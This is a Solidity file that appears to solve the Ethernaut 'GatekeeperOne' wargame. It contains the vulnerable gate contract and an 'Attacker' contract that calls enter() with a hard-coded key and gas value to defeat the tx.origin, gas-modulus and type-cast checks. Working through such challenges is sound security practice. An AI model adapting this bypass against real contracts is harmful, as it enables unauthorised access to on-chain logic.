/**
 *Submitted for verification at Etherscan.io on 2019-02-18
*/

pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attacker {
    
    GatekeeperOne g;
    
    function Attacker(address victim) public {
        g = GatekeeperOne(victim);
    }
    
    function callGateKeeper() public {
        bytes8 b = 0x10000000000080fe;
        g.enter.gas(21000)(b);
    }
}
